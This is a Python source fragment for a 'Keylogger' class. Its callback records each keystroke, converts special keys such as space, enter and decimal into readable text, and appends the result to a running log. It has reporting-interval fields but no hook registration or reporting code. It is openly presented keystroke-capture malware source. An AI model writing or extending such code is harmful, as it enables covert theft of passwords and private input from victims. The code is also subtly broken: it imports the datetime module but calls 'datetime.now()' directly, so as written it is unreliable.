import datetime

class Keylogger:
    def __init__(self, interval=60, reportMethod="file"):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""                           # Contains the log of all the keystrokes within `self.interval`
        self.startDatetime = datetime.now()
        self.endDatetime = datetime.now()

    def callback(self, event):
        """
            This callback is invoked whenever a keyboard event is occured
        """
        name = event.name

        if len(name) > 1:
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name